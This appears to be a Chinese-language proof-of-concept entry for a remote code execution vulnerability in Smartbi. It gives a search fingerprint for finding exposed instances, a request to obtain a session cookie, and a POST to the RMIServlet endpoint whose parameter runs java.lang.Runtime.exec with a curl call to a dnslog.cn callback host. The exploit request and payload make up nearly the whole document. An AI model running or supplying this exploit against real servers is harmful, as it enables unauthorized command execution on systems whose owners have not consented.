# Smartbi存在远程代码执行漏洞漏洞

- **系统**：Smartbi　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="SMARTBI"`
- **请求**：`GET /smartbi/vision/share.jsp?resid=b904ab9f5a84712a672523a7b4881ee4 HTTP/1.1`

**请求体 / payload**
```
取响应生成的JSESSIONID
POST /smartbi/vision/RMIServlet HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: JSESSIONID=3F7DA7E65EE176AE14C5742A435CC0DA
className=MetricsModelForVModule&methodName=checkExpression&params=["java.lang.Runtime.getRuntime().exec('curl n3u9pe.dnslog.cn')"]
```
- **预期**：200　|　—